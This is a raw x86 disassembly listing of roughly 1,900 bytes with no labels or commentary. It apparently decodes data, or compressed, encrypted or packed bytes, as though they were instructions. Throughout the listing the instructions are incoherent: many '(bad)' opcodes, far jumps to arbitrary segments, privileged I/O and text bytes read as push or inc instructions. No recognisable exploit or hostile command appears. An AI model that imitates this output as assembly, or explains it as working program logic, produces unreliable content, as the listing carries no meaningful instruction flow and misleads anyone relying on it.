  41d49b:	add    BYTE PTR [eax+edx*1+0x77530042],cl
  41d4a2:	jbe    0x41d4f4
  41d4a4:	mov    dh,0x85
  41d4a6:	pushf  
  41d4a7:	clc    
  41d4a8:	sbb    ecx,ebp
  41d4aa:	push   eax
  41d4ab:	pop    es
  41d4ac:	es pop es
  41d4ae:	add    BYTE PTR [eax],al
  41d4b0:	push   esp
  41d4b1:	rol    BYTE PTR [ecx+0x0],cl
  41d4b4:	sbb    ecx,DWORD PTR [ebx]
  41d4b6:	add    al,0xe
	...
  41d4e8:	mov    WORD PTR [eax],ss
  41d4ea:	inc    edx
  41d4eb:	add    BYTE PTR [esi+0x67f89c85],dh
  41d4f1:	pushw  0x68
  41d4f4:	addr16 push 0x67
  41d4f7:	pushw  0x6b6a
  41d4fb:	push   0x676b67
	...
  41d508:	es aas 
  41d50a:	inc    eax
  41d50b:	add    BYTE PTR [ebp-0x5db060b1],ah
  41d511:	dec    edi
  41d512:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d513:	dec    edi
  41d514:	lahf   
  41d515:	dec    edi
  41d516:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d517:	dec    edi
  41d518:	ins    DWORD PTR es:[edi],dx
  41d519:	dec    esi
  41d51a:	bound  ecx,QWORD PTR [esi+0x30]
  41d51d:	dec    esi
  41d51e:	add    BYTE PTR [eax],al
  41d520:	cdq    
  41d521:	dec    edi
  41d522:	pushf  
  41d523:	dec    edi
  41d524:	fwait
  41d525:	dec    edi
  41d526:	ins    DWORD PTR es:[edi],dx
  41d527:	dec    esi
  41d528:	bound  ecx,QWORD PTR [esi+0x30]
  41d52b:	dec    esi
  41d52c:	scas   eax,DWORD PTR es:[edi]
  41d52d:	dec    edi
  41d52e:	lods   eax,DWORD PTR ds:[esi]
  41d52f:	dec    edi
  41d530:	lahf   
  41d531:	dec    edi
  41d532:	mov    ds:0x624e6d4f,al
  41d537:	dec    esi
  41d538:	xor    BYTE PTR [esi+0x0],cl
  41d53b:	add    BYTE PTR [ebp-0x5bb067b1],ch
  41d541:	dec    edi
  41d542:	test   eax,0xa04f934f
  41d547:	dec    edi
  41d548:	fwait
  41d549:	dec    edi
  41d54a:	xor    BYTE PTR [esi+0x0],cl
  41d54d:	add    BYTE PTR [eax],al
  41d54f:	add    BYTE PTR [eax],al
  41d551:	add    BYTE PTR [eax],al
  41d553:	add    BYTE PTR [ebp+edi*2-0x62737274],cl
  41d55a:	mov    WORD PTR [ebp-0x32734274],gs
  41d560:	mov    ebp,ds
  41d562:	mov    ebp,gs
  41d564:	mov    ebp,?
  41d566:	mov    WORD PTR ds:0x2d8c1d8c,cs
  41d56c:	mov    WORD PTR ds:0x6d8c5d8c,?
  41d572:	mov    WORD PTR [edx-0x74],?
  41d575:	jae    0x41d503
  41d577:	jo     0x41d505
  41d579:	jno    0x41d507
  41d57b:	jbe    0x41d509
  41d57d:	ja     0x41d50b
  41d57f:	je     0x41d50d
  41d581:	jne    0x41d50f
  41d583:	mov    cl,BYTE PTR [ebx+ecx*4-0x76737774]
  41d58a:	mov    WORD PTR [esi+0x7d9c7c8c],cs
  41d590:	lods   al,BYTE PTR ds:[esi]
  41d591:	jge    0x41d54f
  41d593:	jge    0x41d533
  41d595:	(bad)  
  41d596:	jns    0x41d60b
  41d598:	mov    ecx,0x7d738cb1
  41d59d:	ins    DWORD PTR es:[edi],dx
  41d59e:	enter  0x9fc6,0x26
  41d5a2:	jb     0x41d5a7
  41d5a4:	test   eax,0xb956bb17
  41d5a9:	hlt    
  41d5aa:	test   al,0x37
  41d5ac:	test   al,0x7e
  41d5ae:	fnstenv [ecx-0x6a]
  41d5b1:	mov    cl,0x6a
  41d5b3:	push   0xffffffce
  41d5b5:	or     BYTE PTR [edx],bl
  41d5b7:	xlat   BYTE PTR ds:[ebx]
  41d5b8:	out    dx,eax
  41d5b9:	add    eax,0x9321d7aa
  41d5be:	scas   al,BYTE PTR es:[edi]
  41d5bf:	adc    DWORD PTR [esi],esp
  41d5c1:	jge    0x41d5e6
  41d5c3:	fidiv  WORD PTR [edi]
  41d5c5:	leave  
  41d5c6:	hlt    
  41d5c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5c8:	cmp    ax,0x1fc8
  41d5cc:	mov    dh,cl
  41d5ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5cf:	(bad)  
  41d5d0:	and    DWORD PTR [eax],ebx
  41d5d2:	and    DWORD PTR [ecx-0x18],esi
  41d5d5:	(bad)  [ebx+0x7]
  41d5d8:	cmc    
  41d5d9:	enter  0x301a,0x40
  41d5dd:	adc    BYTE PTR [edx+0x0],al
  41d5e0:	jno    0x41d648
  41d5e2:	jp     0x41d652
  41d5e4:	dec    eax
  41d5e5:	aam    0x41
  41d5e7:	add    BYTE PTR [esp+edx*8-0x12f7ffbf],ch
  41d5ee:	adc    al,BYTE PTR [edi]
  41d5f0:	imul   esp,DWORD PTR [esi+0x4f],0x6f704c74
  41d5f7:	ins    BYTE PTR es:[edi],dx
  41d5f8:	push   0x49657557
  41d5fd:	imul   eax,DWORD PTR fs:[ecx+edi*2+0x54],0x62
  41d603:	push   edi
  41d604:	ins    BYTE PTR es:[edi],dx
  41d605:	inc    edx
  41d606:	push   0x76666a73
  41d60b:	inc    edx
  41d60c:	jo     0x41d657
  41d60e:	dec    ebp
  41d60f:	dec    ebp
  41d610:	pop    edx
  41d611:	jp     0x41d66d
  41d613:	jbe    0x41d65b
  41d615:	pop    ecx
  41d616:	jo     0x41d690
	...
  41d62c:	inc    ebp
  41d62d:	push   edx
  41d62e:	jb     0x41d6a4
  41d630:	inc    esi
  41d631:	je     0x41d674
  41d633:	inc    esi
  41d634:	jae    0x41d6ac
  41d636:	dec    ebx
  41d637:	gs inc edx
  41d639:	inc    bx
  41d63b:	push   ebp
  41d63c:	jno    0x41d6b4
  41d63e:	ja     0x41d6a7
  41d640:	dec    edi
  41d641:	dec    esp
  41d642:	dec    ebp
  41d643:	inc    edx
  41d644:	jno    0x41d6b7
  41d646:	jae    0x41d69b
  41d648:	dec    eax
  41d649:	inc    ebp
  41d64a:	inc    esp
  41d64b:	inc    esp
  41d64c:	push   ecx
  41d64d:	dec    edx
  41d64e:	ins    BYTE PTR es:[edi],dx
  41d64f:	dec    ebx
  41d650:	jbe    0x41d6c0
  41d652:	pop    eax
  41d653:	jbe    0x41d6a0
  41d655:	inc    ecx
  41d656:	fs gs jno 0x41d6c7
  41d65a:	push   ebx
  41d65b:	inc    ecx
  41d65c:	add    BYTE PTR [eax],al
  41d65e:	inc    ebx
  41d65f:	outs   dx,BYTE PTR ds:[esi]
  41d660:	imul   esp,DWORD PTR [edi+0x7a],0x6f
  41d664:	push   edx
  41d665:	push   ecx
  41d666:	push   0x74000064
  41d66b:	jne    0x41d6e2
  41d66d:	ins    DWORD PTR es:[edi],dx
  41d66e:	push   ecx
  41d66f:	push   eax
  41d670:	jo     0x41d6ec
  41d672:	addr16 jo 0x41d6cb
  41d675:	pop    eax
  41d676:	add    BYTE PTR [eax],al
  41d678:	push   ecx
  41d679:	pop    ecx
  41d67a:	inc    ebx
  41d67b:	inc    edx
  41d67c:	outs   dx,BYTE PTR ds:[esi]
  41d67d:	popa   
  41d67e:	imul   eax,DWORD PTR [edx+0x61],0x6b
  41d682:	jne    0x41d6f2
  41d684:	dec    ebx
  41d685:	add    BYTE PTR [ecx+0x45],bh
  41d688:	bound  ebp,QWORD PTR [ecx+0x46]
  41d68b:	dec    ecx
  41d68c:	ja     0x41d6d3
  41d68e:	dec    eax
  41d68f:	inc    ebp
  41d690:	inc    edx
  41d691:	push   ebx
  41d692:	add    BYTE PTR [eax],al
  41d694:	je     0x41d6f9
  41d696:	bound  esp,QWORD PTR [edi+0x78]
  41d699:	dec    eax
  41d69a:	bound  edx,QWORD PTR [ebx+0x43]
  41d69d:	pop    eax
  41d69e:	outs   dx,DWORD PTR ds:[esi]
  41d69f:	push   0x4355
  41d6a4:	inc    edi
  41d6a5:	gs ins BYTE PTR es:[edi],dx
  41d6a7:	dec    esp
  41d6a8:	js     0x41d712
  41d6aa:	inc    edx
  41d6ab:	js     0x41d6f3
  41d6ad:	arpl   WORD PTR [eax],ax
  41d6af:	add    BYTE PTR [eax],al
  41d6b1:	add    BYTE PTR [eax],al
  41d6b3:	add    BYTE PTR [edx+0x70],cl
  41d6b6:	jb     0x41d730
  41d6b8:	outs   dx,DWORD PTR ds:[esi]
  41d6b9:	pop    eax
  41d6ba:	dec    ebx
  41d6bb:	push   esp
  41d6bc:	dec    esp
  41d6bd:	jns    0x41d70a
  41d6bf:	js     0x41d739
  41d6c1:	outs   dx,BYTE PTR ds:[esi]
  41d6c2:	pop    ecx
  41d6c3:	jae    0x41d733
  41d6c5:	push   0x43644448
  41d6ca:	arpl   WORD PTR [edx+0x55],sp
  41d6cd:	push   0x42504e67
  41d6d2:	push   ebp
  41d6d3:	je     0x41d74a
  41d6d5:	addr16 dec edi
  41d6d7:	dec    esp
  41d6d8:	inc    edx
  41d6d9:	ins    DWORD PTR es:[edi],dx
  41d6da:	inc    esi
  41d6db:	inc    esi
  41d6dc:	inc    esi
  41d6dd:	arpl   WORD PTR [edx+0x47],bx
  41d6e0:	push   ebp
  41d6e1:	inc    ebx
  41d6e2:	popa   
  41d6e3:	push   edx
  41d6e4:	dec    esp
  41d6e5:	imul   ecx,DWORD PTR [ecx+0x43],0x54706a5a
  41d6ec:	push   ecx
  41d6ed:	push   ebx
  41d6ee:	imul   ebp,DWORD PTR [ebx+0x52],0x444a454e
  41d6f5:	dec    edx
  41d6f6:	jns    0x41d761
  41d6f8:	push   edx
  41d6f9:	inc    ebx
  41d6fa:	jo     0x41d771
  41d6fc:	imul   ecx,DWORD PTR [ebx+0x50],0x48
  41d700:	fs push ebx
  41d702:	inc    ebx
  41d703:	push   ebp
  41d704:	push   eax
  41d705:	ja     0x41d781
  41d707:	jp     0x41d756
  41d709:	push   esi
  41d70a:	arpl   WORD PTR gs:[ecx+0x45],si
  41d70e:	dec    edx
  41d70f:	dec    esi
  41d710:	data16 ja 0x41d761
  41d713:	imul   ebp,DWORD PTR [eax+0x6e],0x76597148
  41d71a:	dec    esp
  41d71b:	cmp    ebx,ebp
  41d71d:	dec    esp
  41d71e:	lods   eax,DWORD PTR ds:[esi]
  41d71f:	out    dx,al
  41d720:	mov    ebp,0xa53ddffb
  41d725:	js     0x41d6e0
  41d727:	out    0xfa,al
  41d729:	iret   
  41d72a:	inc    edx
  41d72b:	jnp    0x41d6c3
  41d72d:	add    DWORD PTR [eax],eax
  41d72f:	lods   al,BYTE PTR ds:[esi]
  41d730:	add    BYTE PTR [eax],al
  41d732:	add    BYTE PTR [eax+esi*1+0x7e592573],bl
  41d739:	inc    edx
  41d73a:	sahf   
  41d73b:	cli    
  41d73c:	mov    ecx,0xccea0761
  41d741:	or     dl,bh
  41d743:	(bad)  
  41d745:	pinsrw mm5,edx,0xef
  41d749:	add    BYTE PTR [ecx-0x1f2abfd],bl
  41d74f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d750:	xor    esp,eax
  41d752:	lock ret 0xa8b3
  41d756:	mov    ebp,DWORD PTR [eax]
  41d758:	jg     0x41d77b
  41d75a:	test   eax,0x7ccbdcbe
  41d75f:	or     al,0x19
  41d761:	cmp    dl,BYTE PTR [ebp+0x22]
  41d764:	mov    bl,BYTE PTR [edx-0x5]
  41d767:	hlt    
  41d768:	and    esi,DWORD PTR [ebx+0x2a]
  41d76b:	arpl   sp,bx
  41d76d:	sbb    esi,DWORD PTR [ecx+0x4b17c6b7]
  41d773:	xor    dh,dh
  41d775:	test   al,0x78
  41d777:	inc    edx
  41d778:	popa   
  41d779:	(bad)  
  41d77a:	sti    
  41d77b:	pop    esp
  41d77c:	push   ecx
  41d77d:	adc    ebp,DWORD PTR [ebp+0x37]
  41d780:	dec    edi
  41d781:	into   
  41d782:	jmp    0x41d78c
  41d784:	in     al,0xe6
  41d786:	mov    edi,0x3b311ac3
  41d78c:	add    dl,BYTE PTR [ecx]
  41d78e:	jg     0x41d724
  41d790:	add    DWORD PTR [edx+0x64],esp
  41d793:	dec    esi
  41d794:	test   eax,0xb99012c7
  41d799:	sbb    esi,DWORD PTR [edi+0x4d]
  41d79c:	ss and ecx,DWORD PTR fs:[ecx+edi*2+0x37]
  41d7a2:	rol    BYTE PTR [eax+0x47],1
  41d7a5:	cdq    
  41d7a6:	add    al,0xf1
  41d7a8:	dec    edx
  41d7a9:	mov    ebx,esi
  41d7ab:	xchg   ebx,eax
  41d7ac:	into   
  41d7ad:	adc    DWORD PTR [edi-0x6b],0xbcded52a
  41d7b4:	sub    bh,ch
  41d7b6:	mov    ds:0x75a9c289,eax
  41d7bb:	xlat   BYTE PTR ds:[ebx]
  41d7bc:	dec    ebp
  41d7bd:	dec    edi
  41d7be:	adc    BYTE PTR [eax+edi*1],dl
  41d7c1:	ins    DWORD PTR es:[edi],dx
  41d7c2:	test   BYTE PTR [eax+ebx*4+0x63c255e1],cl
  41d7c9:	loope  0x41d7b3
  41d7cb:	cs or  eax,0xfb46f0dc
  41d7d1:	shl    BYTE PTR [edx],0x10
  41d7d4:	adc    ch,ch
  41d7d6:	inc    ecx
  41d7d7:	or     ecx,ecx
  41d7d9:	mov    bl,BYTE PTR [eax+ebp*8+0x4a17ff]
	...
  41d7e8:	add    BYTE PTR [eax],al
  41d7ea:	add    BYTE PTR [eax],ch
  41d7ec:	mov    dl,0xa5
  41d7ee:	push   edx
  41d7ef:	mov    edi,0x7cfaff57
  41d7f4:	xlat   BYTE PTR fs:[ebx]
  41d7f6:	push   esi
  41d7f7:	sbb    cl,al
  41d7f9:	js     0x436f26
  41d7ff:	lods   al,BYTE PTR ds:[esi]
  41d800:	add    BYTE PTR [eax],al
  41d802:	add    BYTE PTR [ebp-0x14],bl
  41d805:	out    dx,eax
  41d806:	call   0xbd6d:0x9e48c299
  41d80d:	jb     0x41d7d2
  41d80f:	test   BYTE PTR ds:[ebx+0x3b],bl
  41d813:	ja     0x41d83f
  41d815:	ins    DWORD PTR es:[edi],dx
  41d816:	in     eax,dx
  41d817:	mov    ds:0xf71fbe91,eax
  41d81c:	arpl   dx,si
  41d81e:	outs   dx,DWORD PTR ds:[esi]
  41d81f:	fsub   QWORD PTR [ecx-0x65bcd06e]
  41d825:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d826:	sbb    al,0x3f
  41d828:	or     BYTE PTR [eax-0x223b8c37],dl
  41d82e:	jmp    0x9def6429
  41d833:	pop    ebp
  41d834:	push   edi
  41d835:	out    0xa2,al
  41d837:	and    bl,dh
  41d839:	mov    ch,0x68
  41d83b:	xchg   esp,eax
  41d83c:	sbb    dl,dl
  41d83e:	sbb    ch,0x72
  41d841:	pushf  
  41d842:	mov    ch,0x83
  41d844:	sub    eax,0x6254a7c6
  41d849:	sub    esp,esp
  41d84b:	xor    dl,cl
  41d84d:	adc    DWORD PTR ds:0x65ff5987,ebp
  41d853:	shl    eax,cl
  41d855:	pop    esi
  41d856:	cmc    
  41d857:	pop    ecx
  41d858:	dec    ecx
  41d859:	or     edx,esi
  41d85b:	sub    ebx,DWORD PTR [ebp+0x68458a9e]
  41d861:	xchg   edx,eax
  41d862:	add    al,0xf6
  41d864:	hlt    
  41d865:	test   al,0x19
  41d867:	adc    DWORD PTR [edx+ebx*4],ebp
  41d86a:	shl    DWORD PTR [edi+0x36377031],1
  41d870:	loopne 0x41d7f7
  41d872:	push   es
  41d873:	cmp    eax,0x6d95674b
  41d878:	test   DWORD PTR [eax],esp
  41d87a:	add    DWORD PTR [edi],edi
  41d87c:	mov    esp,0x6d7b3c0b
  41d881:	mov    ecx,0x973aefe7
  41d886:	sbb    bl,BYTE PTR [ecx+0x168e0875]
  41d88c:	rol    BYTE PTR [esi],cl
  41d88e:	sub    eax,0xfabfdba3
  41d893:	scas   eax,DWORD PTR es:[edi]
  41d894:	test   eax,0x1eff4660
  41d899:	inc    esi
  41d89a:	cmp    DWORD PTR [esi+0x39],ebx
  41d89d:	push   ebp
  41d89e:	ret    0x383
  41d8a1:	or     esi,DWORD PTR [ebx+0x25]
  41d8a4:	push   ebp
  41d8a5:	and    BYTE PTR [edi],dh
  41d8a7:	fwait
  41d8a8:	sbb    bh,BYTE PTR [edi]
  41d8aa:	push   0xc35cc15b
	...
  41d8bb:	mov    bl,0x55
  41d8bd:	jg     0x41d840
  41d8bf:	jmp    FWORD PTR [ebx-0x69418801]
  41d8c5:	push   0x6b64a757
  41d8ca:	je     0x41d89f
  41d8cc:	xchg   edi,eax
  41d8cd:	add    DWORD PTR [eax],eax
  41d8cf:	lods   al,BYTE PTR ds:[esi]
  41d8d0:	add    BYTE PTR [eax],al
  41d8d2:	add    BYTE PTR [edx-0x5e56c2d5],cl
  41d8d8:	fsub   st(3),st
  41d8da:	sub    eax,0x8b5b4083
  41d8df:	fs mov ecx,0x8f31e37c
  41d8e5:	inc    edx
  41d8e6:	pop    es
  41d8e7:	mov    eax,0x22e013af
  41d8ec:	pop    es
  41d8ed:	test   dh,0x78
  41d8f0:	add    eax,DWORD PTR [esi]
  41d8f2:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  41d8f4:	ins    DWORD PTR es:[edi],dx
  41d8f5:	jmp    0xecf0:0xbe5bc6b8
  41d8fc:	mov    al,ds:0x1c3fe4e3
  41d901:	fisub  WORD PTR [esi+0x5f5e8a86]
  41d907:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d908:	popf   
  41d909:	test   DWORD PTR [edx-0x1c],esp
  41d90c:	cdq    
  41d90d:	jb     0x41d8b6
  41d90f:	and    DWORD PTR [edi+0x6e702851],ebx
  41d915:	pop    ds
  41d916:	pop    ss
  41d917:	(bad)  
  41d918:	pop    ss
  41d919:	ja     0x41d91e
  41d91b:	stc    
  41d91c:	cmp    al,0x89
  41d91e:	popf   
  41d91f:	jmp    0xf1c9:0x8ea3b5b4
  41d926:	repz int3 
  41d928:	scas   eax,DWORD PTR es:[edi]
  41d929:	prefetch BYTE PTR [edi]
  41d92c:	jg     0x41d94b
  41d92e:	inc    eax
  41d92f:	scas   eax,DWORD PTR es:[edi]
  41d930:	fdivr  st(3),st
  41d932:	or     cl,dh
  41d934:	push   0xa9bfa514
  41d939:	sbb    al,0xc8
  41d93b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d93c:	pop    ebx
  41d93d:	mov    WORD PTR [edi-0x10116dc9],cs
  41d943:	jo     0x41d92d
  41d945:	xor    BYTE PTR [esi],ah
  41d947:	push   edx
  41d948:	jecxz  0x41d9ae
  41d94a:	(bad)  
  41d94b:	pop    ss
  41d94c:	mov    ebx,esi
  41d94e:	mov    edx,0x17d536fa
  41d953:	inc    edx
  41d954:	push   ebx
  41d955:	mov    ecx,0xbd67188a
  41d95a:	cwde   
  41d95b:	fcom   QWORD PTR [ebx+0x6040c833]
  41d961:	fcom   DWORD PTR [esi-0x1f142977]
  41d967:	jmp    0x41d9ca
  41d969:	retf   
  41d96a:	cmp    eax,0xe1ba32f1
  41d96f:	push   ss
  41d970:	cmp    bl,cl
  41d972:	or     BYTE PTR [edx],dl
  41d974:	xor    DWORD PTR [esi+0x6f],ebp
  41d977:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d978:	fmul   DWORD PTR [ebp+0x21]
  41d97b:	idiv   cl
  41d97d:	das    
  41d97e:	inc    edi
	...
  41d98b:	cmp    dh,dl
  41d98d:	cmp    ah,BYTE PTR [esi+edi*8]
  41d990:	in     al,dx
  41d991:	fimul  WORD PTR ds:[edi+0x16ac6bd5]
  41d998:	jmp    0x1:0x987fca96
  41d99f:	lods   al,BYTE PTR ds:[esi]
  41d9a0:	add    BYTE PTR [eax],al
  41d9a2:	add    BYTE PTR [esi+0x5c],bl
  41d9a5:	retf   0x2698
  41d9a8:	bound  ebx,QWORD PTR [eax-0x1e]
  41d9ab:	xor    cl,0xc4
  41d9ae:	xchg   ebx,eax
  41d9af:	cmp    eax,0x1c861c3b
  41d9b5:	nop
  41d9b6:	inc    ebp
  41d9b7:	in     eax,0xa8
  41d9b9:	push   eax
  41d9ba:	sti    
  41d9bb:	jmp    DWORD PTR [esp+eax*2-0x5]
  41d9bf:	or     BYTE PTR [ebx-0x56],ch
  41d9c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d9c3:	ret    
  41d9c4:	push   esi
  41d9c5:	ror    BYTE PTR [ecx-0x66],1
  41d9c8:	stos   BYTE PTR es:[edi],al
  41d9c9:	lahf   
  41d9ca:	ficom  DWORD PTR [esi]
  41d9cc:	mov    al,cl
  41d9ce:	(bad)  
  41d9cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d9d0:	cmp    eax,0x3f703729
  41d9d5:	push   edx
  41d9d6:	mov    ds:0x223f1b4c,eax
  41d9db:	ss jg  0x41d986
  41d9de:	mov    bh,0xf6
  41d9e0:	pop    ds
  41d9e1:	stos   BYTE PTR es:[edi],al
  41d9e2:	push   edi
  41d9e3:	inc    ebp
  41d9e4:	loop   0x41da4d
  41d9e6:	mov    dl,0x8c
  41d9e8:	jge    0x41d96b
  41d9ea:	sti    
  41d9eb:	xor    al,0xd2
  41d9ed:	retf   0xbdf5
  41d9f0:	mov    ds:0xd42601ca,eax
  41d9f5:	xchg   edi,eax
  41d9f6:	mov    dl,0x0
  41d9f8:	stc    
  41d9f9:	lea    ebx,[edx]
  41d9fb:	and    ch,BYTE PTR [esi]
  41d9fd:	push   0x26c5e050
  41da02:	jp     0x41d9b9
  41da04:	cld    
  41da05:	pop    ds
  41da06:	xchg   BYTE PTR [edi],ah
  41da08:	retf   
  41da09:	es mov al,0xfb
  41da0c:	cwde   
  41da0d:	xchg   BYTE PTR [eax],cl
  41da0f:	adc    eax,DWORD PTR [eax]
  41da11:	mov    eax,DWORD PTR gs:[esi-0x222145c4]
  41da18:	mov    ecx,0x90c6e9cc
  41da1d:	call   0x557f:0x93941642
  41da24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da25:	stos   BYTE PTR es:[edi],al
  41da26:	and    ecx,DWORD PTR [edx+0x65c90d77]
  41da2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da2d:	setnp  BYTE PTR [edi]
  41da30:	pop    ebx
  41da31:	fcmovu st,st(0)
  41da33:	jbe    0x41da5a
  41da35:	push   edx
  41da36:	in     eax,0x35
  41da38:	push   ds
  41da39:	mov    al,ds:0xff31ff98
  41da3e:	mov    edi,0x474f52f2
  41da43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da44:	jne    0x41da5b
  41da46:	dec    ecx
  41da47:	xor    eax,DWORD PTR [edx]
  41da49:	sbb    edx,DWORD PTR [ecx]
  41da4b:	loopne 0x41da67
  41da4d:	cld    
  41da4e:	js     0x41da50
	...
  41da58:	add    BYTE PTR [eax],al
  41da5a:	add    cl,bl
  41da5c:	mov    dh,0x66
  41da5e:	sbb    ebp,DWORD PTR [edi-0x25]
  41da61:	std    
  41da62:	neg    BYTE PTR [esi]
  41da64:	sub    esp,DWORD PTR [ebx-0x23]
  41da67:	(bad)  
  41da68:	add    esi,eax
  41da6a:	pop    es
  41da6b:	sub    ebx,DWORD PTR [ecx+0xac0001]
  41da71:	add    BYTE PTR [eax],al
  41da73:	fsub   DWORD PTR [edx+0x610d2e51]
  41da79:	les    ebx,FWORD PTR [ebp-0x7f]
  41da7c:	call   0xc316:0xd16aa6a8
  41da83:	push   cs
  41da84:	imul   edi,DWORD PTR [ebp+0x3b],0xdad35cf8
  41da8b:	sbb    al,0xfd
  41da8d:	sub    al,0x5f
  41da8f:	sub    eax,0x5531cf26
  41da94:	pop    eax
  41da95:	push   ebp
  41da96:	loop   0x41da97
  41da98:	or     DWORD PTR [edi],esp
  41da9a:	icebp  
  41da9b:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41da9d:	sti    
  41da9e:	out    0x8a,al
  41daa0:	and    ch,BYTE PTR [eax-0x34]
  41daa3:	jge    0x41db22
  41daa5:	pop    ecx
  41daa6:	cld    
  41daa7:	lods   al,BYTE PTR ds:[esi]
  41daa8:	inc    esi
  41daa9:	jl     0x41da6d
  41daab:	lods   eax,DWORD PTR ds:[esi]
  41daac:	in     eax,0x45
  41daae:	jb     0x41daf5
  41dab0:	mov    ch,0x59
  41dab2:	pop    ds
  41dab3:	loopne 0x41da39
  41dab5:	xchg   BYTE PTR [ebx+0x743f8ea3],al
  41dabb:	mov    dl,0xd8
  41dabd:	outs   dx,DWORD PTR ds:[esi]
  41dabe:	sbb    BYTE PTR [edi],dl
  41dac0:	call   0xa41b:0xb3f3a66b
  41dac7:	pop    edi
  41dac8:	pusha  
  41dac9:	shl    BYTE PTR [ebx],0x6d
  41dacc:	cmp    edi,DWORD PTR [ebp+0x7226ca04]
  41dad2:	es icebp 
  41dad4:	retf   
  41dad5:	mov    dh,0xf7
  41dad7:	and    eax,0xdd9e384a
  41dadc:	mov    ds:0xab5f2b4,al
  41dae1:	dec    esp
  41dae2:	retf   0xcc8b
  41dae5:	lods   al,BYTE PTR ds:[esi]
  41dae6:	jne    0x41daf5
  41dae8:	aas    
  41dae9:	mov    ds:0xfd303f4d,eax
  41daee:	push   ss
  41daef:	inc    ebp
  41daf0:	std    
  41daf1:	push   edi
  41daf2:	aas    
  41daf3:	adc    esp,DWORD PTR [edx+0x27]
  41daf6:	xchg   ecx,eax
  41daf7:	jmp    0x50f2:0x3499a7d0
  41dafe:	pop    ebp
  41daff:	imul   ecx,DWORD PTR [edi+ecx*2],0xffffffbf
  41db03:	mov    cl,0x47
  41db05:	adc    esp,DWORD PTR [ebp-0x48695398]
  41db0b:	loope  0x41db1a
  41db0d:	nop
  41db0e:	enter  0xf2ee,0xcc
  41db12:	push   ebp
  41db13:	mov    al,0xc5
  41db15:	in     al,0xbe
  41db17:	jne    0x41db86
  41db19:	daa    
  41db1a:	and    BYTE PTR [edi],ch
  41db1c:	mov    ch,0xbd
  41db1e:	mov    ebx,0x0
	...
  41db2b:	fidiv  DWORD PTR [edx]
  41db2d:	xchg   edi,eax
  41db2e:	mov    bh,bh
  41db30:	scas   eax,DWORD PTR es:[edi]
  41db31:	fbstp  TBYTE PTR [edx+0x3]
  41db34:	inc    ebp
  41db35:	mov    ds:0x853ce45c,eax
  41db3a:	aad    0xd7
  41db3c:	cdq    
  41db3d:	add    DWORD PTR [eax],eax
  41db3f:	lods   al,BYTE PTR ds:[esi]
  41db40:	add    BYTE PTR [eax],al
  41db42:	add    BYTE PTR [ecx+0x2a],ah
  41db45:	mov    ah,bl
  41db47:	in     al,dx
  41db48:	and    BYTE PTR [ecx-0x2587cd8],ch
  41db4e:	vaesenclast ymm4,ymm1,YMMWORD PTR [esi]
  41db53:	loop   0x41dbd4
  41db55:	adc    eax,0xdf3e723
  41db5a:	daa    
  41db5b:	imul   esi,DWORD PTR [bp+si-0x65ac],0xa609e91
  41db64:	fwait
  41db65:	adc    BYTE PTR [ebx+0x48dd11d2],cl
  41db6b:	sti    
  41db6c:	jmp    0xbcc3f167
  41db71:	adc    DWORD PTR [esi],edx
  41db73:	rcr    ch,1
  41db75:	jo     0x41db19
  41db77:	mov    ds:0x59cee023,eax
  41db7c:	add    BYTE PTR [edi+0x48],ah
  41db7f:	sub    BYTE PTR [edi-0x2af3e41d],ch
  41db85:	cmp    al,0xa9
  41db87:	scas   al,BYTE PTR es:[edi]
  41db88:	cmp    BYTE PTR cs:[ecx+0x68],dh
  41db8c:	cmc    
  41db8d:	ds je  0x41db9a
  41db90:	daa    
  41db91:	pop    edi
  41db92:	je     0x41dbfb
  41db94:	icebp  
  41db95:	ins    DWORD PTR es:[edi],dx
  41db96:	out    dx,eax
  41db97:	xchg   ecx,eax
  41db98:	push   ss
  41db99:	loope  0x41dbcb
  41db9b:	adc    eax,0xa26e951a
  41dba0:	imul   ebp,esi,0x5d
  41dba3:	inc    ecx
  41dba4:	push   eax
  41dba5:	stos   BYTE PTR es:[edi],al
  41dba6:	mov    ebp,0xbfc74be0
  41dbab:	sar    BYTE PTR [eax+0x5c],cl
  41dbae:	pushf  
  41dbaf:	rol    BYTE PTR ds:0x8cb3d38b,0x2
  41dbb6:	je     0x41dbce
  41dbb8:	ret    0x2689
  41dbbb:	mov    esp,0xbbfc36a2
  41dbc0:	inc    eax
  41dbc1:	jmp    0xacd0:0x2ad967f
  41dbc8:	mov    bl,BYTE PTR [edi-0x5d2761c4]
  41dbce:	jmp    0x41dc02
  41dbd0:	fiadd  WORD PTR [ebx]
  41dbd2:	dec    esi
  41dbd3:	jbe    0x41dc17
  41dbd5:	add    BYTE PTR [ecx+edi*8],bl
  41dbd8:	js     0x41dbea
  41dbda:	and    al,0x97
  41dbdc:	mov    edi,0xe4b803b4
  41dbe1:	js     0x41dc24
  41dbe3:	dec    eax
  41dbe4:	aad    0xd3
  41dbe6:	mov    dh,0xc
  41dbe8:	cld    
  41dbe9:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  41dbeb:	std    
  41dbec:	out    dx,eax
  41dbed:	mov    ds:0x51,al
	...
  41dbfa:	add    BYTE PTR [eax-0x1c],cl
  41dbfd:	add    ebx,DWORD PTR [ebx-0x8270051]
  41dc03:	pop    esi
  41dc04:	sub    BYTE PTR [eax-0x6da1c371],bl
  41dc0a:	loop   0x41db8f
  41dc0c:	call   0x0:0xac0001
  41dc13:	icebp  
  41dc14:	ret    0xc88c
  41dc17:	out    dx,eax
  41dc18:	paddq  mm7,QWORD PTR [ebx]
